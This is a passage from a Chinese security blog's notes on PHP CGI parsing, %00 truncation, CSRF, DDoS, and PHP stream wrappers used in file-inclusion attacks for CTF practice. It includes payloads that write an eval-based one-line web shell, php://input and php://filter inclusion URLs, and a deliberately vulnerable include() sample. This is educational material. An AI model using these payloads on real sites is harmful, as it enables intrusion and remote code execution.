title="3.PHP CGI解析漏洞"></a>3.PHP CGI解析漏洞</h3><p>在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>的文件，然后访问wooyun.jpg&#x2F;x.php,（x.php不存在）在这个目录下就会生成一句话木马 shell.php。</p><h3 id="4-00截断漏洞"><a href="#4-00截断漏洞" class="headerlink" title="4.%00截断漏洞"></a>4.%00截断漏洞</h3><p>当程序在输出含有chr(0)变量时，即为%00，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生</p><h2 id="CSRF（Cross-Site-Request-Forgery）"><a href="#CSRF（Cross-Site-Request-Forgery）" class="headerlink" title="CSRF（Cross-Site Request Forgery）"></a>CSRF（Cross-Site Request Forgery）</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>CSRF是一种夹持用户在已经登陆的web应用程序上执行非本意的操作的攻击方式。相比于XSS，CSRF是利用了系统对页面浏览器的信任，XSS则利用了系统对用户的信任。</p><h3 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602152807887.png" alt="image-20200602152807887"></p><ol><li>客户端通过账户密码登陆访问网站A</li><li>网站A验证客户端的账号密码。成功则生成一个sessionID ,井返回给客户端存储在浏览器中</li><li>该客户端tab-个新页面访问了网站B</li><li>网站B自动触发要求该客户端访问网站A (即在网站B中有链接指向网站A)</li><li>客户端通过网站B中的链接访问网站A (此时带携带有合法的sessionID进行访问网站A的)</li><li>此时网站A只需检验sessionID是否合法,合法则执行相应的操作<br>(因此具体啥攻击就得看链接t以及网站B要求访问时携带的数据)</li></ol><p>由上图分析我们可以知道构成CSRF攻击是有条件的：</p><ul><li>客户端必须一个网站并生成cookie凭证存储在浏览器中</li><li>该cookie没有清除，客户端又tab一个页面进行访问别的网站</li></ul><h3 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h3><p>攻击者利用会话劫持达到自己的目的，比如转账、积分等</p><h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><p>（1） GET、POST的正确使用<br>（2） 利用验证码（在一定的情况下使用，但是为了防止客户产生不好印象，尽量不用）<br>（3） Referer Check(HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。但服务器并非任何时候都能取到referer、保护客户隐私，不作为预防主要手段)<br>（4） Anti CSRF Token：<br>为每一个表单生成一个随机数秘钥，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><h2 id="DDos攻击-分布式拒绝服务-Distributed-Denial-of-service-Attack"><a href="#DDos攻击-分布式拒绝服务-Distributed-Denial-of-service-Attack" class="headerlink" title="DDos攻击 分布式拒绝服务(Distributed Denial of service Attack)"></a>DDos攻击 分布式拒绝服务(Distributed Denial of service Attack)</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>攻击者想办法让目标服务器的磁盘空间、内存、进程、网络带宽等资源被占满，从而导致正常用户无法访问。<br>攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，无法接收新的请求;二是使用IP欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接。<br>攻击者是使用傀儡机(俗称“肉鸡”，受病毒木马操控的计算机或服务器)作为攻击平台，通过大量伪装合法的请求占用大量网络资源，以达到使指定目标的网络或服务瘫痪中断。</p><h3 id="危害-4"><a href="#危害-4" class="headerlink" title="危害"></a>危害</h3><p>服务器瘫痪、用户无法正常访问。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>（1）SYN Flood攻击：这种攻击方法是经典最有效的DDoS方法，主要是通过向受害主机发送大量伪造源 IP 和源端口的 SYN 或 ACK 包，导致主机的缓存资源被耗尽或忙于发送回应包而造成拒绝服务，可通杀各种系统的网络服务。这种攻击由于源头都是伪造的，所以追踪起来比较困难。但是，该攻击实施起来有一定难度，需要大量高带宽的僵尸主机。<br>（2）TCP 全连接攻击：这种攻击是为了绕过常规防火墙的检查而设计的。一般情况下，常规防火墙大多对于正常的 TCP 连接是放过的，但是很多网络服务程序能接受的 TCP 连接数是有限的。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的 TCP 连接，直到服务器的内存等资源被耗尽而被拖跨， 从而造成拒绝服务。种攻击的特点是可绕过一般防火墙的防护而达到攻击;缺点是需要找很多僵尸主机，且僵尸主机的IP 是暴露，易被追踪。<br>（3）刷 Script 脚本攻击：这种攻击是跟服务器建立正常的TCP连接， 并不断的向脚本程序提交查询、 列表等大量耗费数据库资源的调用。一般来说， 提交一个指令对客户端的耗费和带宽的占用是几乎可以忽略的，而服务器为处理此请求却可能要从上万条记录中去查出某个记录，这种处理过程对资源的耗费是非常大。攻击者只需通过代理向目标服务器大量递交查询指令，只需数分钟就会把服务器资源消耗掉而导致拒绝服务。这种攻击的特点是可以完全绕过普通的防火墙防护， 轻松找一些代理就可实施攻击;缺点是对付只有静态页面的网站效果会大打折扣，并且会暴露攻击者的IP地址。</p><h3 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h3><p>（1）采用高性能的网络设备<br>（2）尽量避免NAT的使用（NAT需要对地址来回转换，转换过程中需要对网络包的校验和进行计算，因此浪费了很多CPU的时间）<br>（3）充足的网络带宽保证<br>（4）升级主机服务器硬件<br>（5）把网站做成静态页面<br>（6）增强操作系统的TCP&#x2F;IP栈<br>（7）安装专业抗DDOS防火墙<br>附：IP Spoof: 即IP地址欺骗，是一台主机设备冒充另外一台主机的IP地址，与其它设备通信，从而达到某种目的技术。属于IP Spoof类的攻击还有TCP 半连接攻击，也就是SYN Flood攻击</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP Protocols and File Inclusion Vulnerabilities</title>
      <link href="/2020/05/25/PHP-Protocols-and-File-Inclusion-Vulnerabilities/"/>
      <url>/2020/05/25/PHP-Protocols-and-File-Inclusion-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-PHP伪协议"><a href="#0x01-PHP伪协议" class="headerlink" title="0x01 PHP伪协议"></a>0x01 PHP伪协议</h2><p>PHP伪协议事实上是其支持的协议与封装协议，会多次出现在CTFweb题中，并且有很多妙用。</p><p>PHP中支持的协议种类一共有12种:<br><a href="https://www.php.net/manual/zh/wrappers.file.php">file</a>、<a href="https://www.php.net/manual/zh/wrappers.http.php">http</a>、<a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp</a>、<a href="https://www.php.net/manual/zh/wrappers.php.php">php</a>、<a href="https://www.php.net/manual/zh/wrappers.zlib.php">zlib</a>、<a href="https://www.php.net/manual/zh/wrappers.data.php">data</a>、<a href="https://www.php.net/manual/zh/wrappers.glob.php">glob</a>、<a href="https://www.php.net/manual/zh/wrappers.phar.php">phar</a>、<a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2</a>、<a href="https://www.php.net/manual/zh/wrappers.rar.php">rar</a>、<a href="https://www.php.net/manual/zh/wrappers.ogg.php">ogg</a>、<a href="https://www.php.net/manual/zh/wrappers.expect.php">expect</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">//    — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">//    — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">//     — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">//     — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">//    — 压缩流</span></span><br><span class="line">data:<span class="comment">//    — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">//    — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">//    — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">//    — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">//     — RAR</span></span><br><span class="line">ogg:<span class="comment">//     — 音频流</span></span><br><span class="line">expect:<span class="comment">//  — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h3 id="0x001-file-协议"><a href="#0x001-file-协议" class="headerlink" title="0x001 file:&#x2F;&#x2F;协议"></a>0x001 file:&#x2F;&#x2F;协议</h3><p>PHP.ini：</p><p><strong>file:&#x2F;&#x2F; 协议在双off的情况下也可以正常使用:</strong></p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：off&#x2F;on</p></blockquote><p><strong>file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</strong></p><p><strong>实例</strong></p><p>新建cmd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$page</span>))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><p><em>file:&#x2F;&#x2F;{文件的绝对路径和文件名}</em></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=file://E:/phpStudy/WWW/phpinfo.php</span><br></pre></td></tr></table></figure><p>即可读取.</p><h3 id="0x002-php-协议"><a href="#0x002-php-协议" class="headerlink" title="0x002 php:&#x2F;&#x2F;协议"></a>0x002 php:&#x2F;&#x2F;协议</h3><p>条件：</p><blockquote><p>不需要开启allow_url_fopen</p><p>仅php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include。</p></blockquote><p>应用：</p><blockquote><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams）</p><p>在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input</p><p>php:&#x2F;&#x2F;filter用于读取源码</p><p>php:&#x2F;&#x2F;input用于执行php代码</p></blockquote><p><code>php://stdin</code>是只读的</p><p><code>php://stdout</code> 和 <code>php://stderr</code> 是只写的。</p><h4 id="php-stdin"><a href="#php-stdin" class="headerlink" title="php:&#x2F;&#x2F;stdin"></a>php:&#x2F;&#x2F;stdin</h4><p>打开一个文件指针进行读取<code>fopen(&#39;php://stdin&#39;,&#39;r&#39;)</code></p><h4 id="php-stdout"><a href="#php-stdout" class="headerlink" title="php:&#x2F;&#x2F;stdout"></a>php:&#x2F;&#x2F;stdout</h4><p>打开一个文件指针进行写入<code>fopen(&#39;php://stdout&#39;, &#39;w&#39;);</code></p><h4 id="php-stderr"><a href="#php-stderr" class="headerlink" title="php:&#x2F;&#x2F;stderr"></a>php:&#x2F;&#x2F;stderr</h4><p>打开一个文件指针进行写入<code> fopen( &#39;php://stderr&#39;, &#39;w&#39; );</code></p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p><strong>注:</strong></p><p><strong>php:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</strong></p><p>PHP.ini：</p><p>php:&#x2F;&#x2F;filter在双off的情况下也可以正常使用；</p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：off&#x2F;on</p></blockquote><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">resource&#x3D;&lt;要过滤的数据流&gt;</td><td align="center">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="center">read&#x3D;&lt;读链的筛选列表&gt;</td><td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符 （ | ）分隔。</td></tr><tr><td align="center">write&#x3D;&lt;写链的筛选列表&gt;</td><td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分隔。</td></tr><tr><td align="center">&lt;;两个链的筛选列表&gt;</td><td align="center">任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p><strong>可以运用多种过滤器（字符串&#x2F;转换&#x2F;压缩&#x2F;加密）</strong><br>例如平时我们用来<strong>任意文件读取</strong>的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=upload.php</span></span><br><span class="line">这里读的过滤器为convert.base64-encode,把输入流进行base64编码</span><br><span class="line">resource=upload.php，代表读取upload.php的内容</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524161149988.png" alt="image-20200524161149988"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524161102548.png" alt="image-20200524161102548"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524162107743.png" alt="image-20200524162107743"></p><p><strong>灵活使用</strong></p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;&lt;读取链需要应用的过滤器列表&gt;</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode|string.toupper|string.rot14/resource=phpinfo.php</span><br></pre></td></tr></table></figure><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p><strong>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</strong> </p><p><code>php://input</code> 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 <code>php.ini</code> 指令。<br><strong>注：enctype&#x3D;”multipart&#x2F;form-data” 的时候 <code>php://input</code> 是无效的。</strong></p><p><strong>PHP.ini：</strong></p><blockquote><p>allow_url_fopen ：off&#x2F;on</p><p>allow_url_include：on</p></blockquote><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/cmd.php?file=php://input</span><br><span class="line">同时POST：file=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524193720261.png" alt="image-20200524193720261"></p><p>需要注意:</p><ul><li>测试过程中必须要开启allow_url_include，否则会报错</li><li>非测试状态下则需要关闭，否则造成任意代码执行</li></ul><p><strong>实战中也可以POST如下内容生成一句话：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(“shell.php”,”w”),’&lt;?php <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>];?&gt;’);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="php-output"><a href="#php-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h4><p><code>php://output</code> 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/read.php?file=php://output</span><br></pre></td></tr></table></figure><p>read.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$test</span>,<span class="string">&#x27;this is test&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524195724335.png" alt="image-20200524195724335"></p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a><strong>过滤器</strong></h4><p>过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">string.rot13</td><td align="center">进行rot13转换</td></tr><tr><td align="center">string.toupper</td><td align="center">将字符全部大写</td></tr><tr><td align="center">string.tolower</td><td align="center">将字符全部小写</td></tr><tr><td align="center">string.strip_tags</td><td align="center">去除空字符、HTML 和 PHP 标记后的结果，</td></tr><tr><td align="center">功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式</td><td align="center"></td></tr></tbody></table><p><strong>举例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.rot13&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;rot13:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.toupper&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upper:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.tolower&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Lower:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del1:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del2:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE, <span class="string">&quot;&lt;b&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>, STREAM_FILTER_WRITE, <span class="keyword">array</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;h1&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Del3:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;b&gt;This is a test.&lt;/b&gt;!!!!&lt;h1&gt;~~~~&lt;/h1&gt;\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524200557962.png" alt="image-20200524200557962"></p><h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><p><strong>convert.base64-encode &amp; convert.base64-decode</strong></p><blockquote><p>base64 编码解码<br>convert.base64-encode和convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用 line-length个字符为长度而截成块。如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同。</p></blockquote><p>**convert.quoted-printable-encode &amp; convert.quoted-printable-decode **</p><blockquote><p>quoted-printable 编码解码<br>convert.quoted-printable-encode和 convert.quoted-printable-decode等同于用 quoted_printable_decode()函数处理所有的流数据。没有和 convert.quoted-printable-encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。</p></blockquote><p><strong>举例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-encode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;base64-encode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$param</span> = <span class="keyword">array</span>(<span class="string">&#x27;line-length&#x27;</span> =&gt; <span class="number">8</span>, <span class="string">&#x27;line-break-chars&#x27;</span> =&gt; <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-encode&#x27;</span>, STREAM_FILTER_WRITE, <span class="variable">$param</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nbase64-encode-split:\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.base64-decode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\nbase64-decode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;VGhpcyBpcyBhIHRlc3QuCg==\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;quoted-printable-encode:&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://output&#x27;</span>, <span 